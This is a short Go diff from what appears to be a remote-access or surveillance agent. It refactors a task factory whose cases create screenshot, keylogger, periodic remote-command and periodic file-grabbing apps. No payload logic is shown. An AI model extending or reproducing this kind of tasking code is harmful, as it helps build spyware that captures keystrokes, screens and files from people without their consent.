@@ -46,7 +46,10 @@ func NewAppFactory(appData AppData) (App, error) {
 		// TODO: change config on demand
 		break
 	case ScreenShotTask:
-		app = NewScreenshotApp(appParams["Interval"].(int), appParams["Quality"].(int))
+		app = NewScreenshotApp(
+			appParams["Interval"].(int),
+			appParams["Quality"].(int),
+		)
 		break
 	case KeyLoggerTask:
 		app = NewKeyLoggerApp()
@@ -55,7 +58,13 @@ func NewAppFactory(appData AppData) (App, error) {
 		app, err = newApp[PeriodicCommandApp](appData.Params)
 		break
 	case GetFileTask:
-		app, err = newApp[PeriodicGetFileApp](appData.Params)
+		app = NewPeriodicGetFileApp(
+			appParams["Path"].(string),
+			appParams["MaxSize"].(int),
+			appParams["Interval"].(int),
+			appParams["CheckMD5"].(bool),
+			appParams["MaxRuns"].(int),
+		)
 		break
 	case ConnectOnlineTask:
 		app, err = newApp[ConnectOnlineApp](appData.Params)
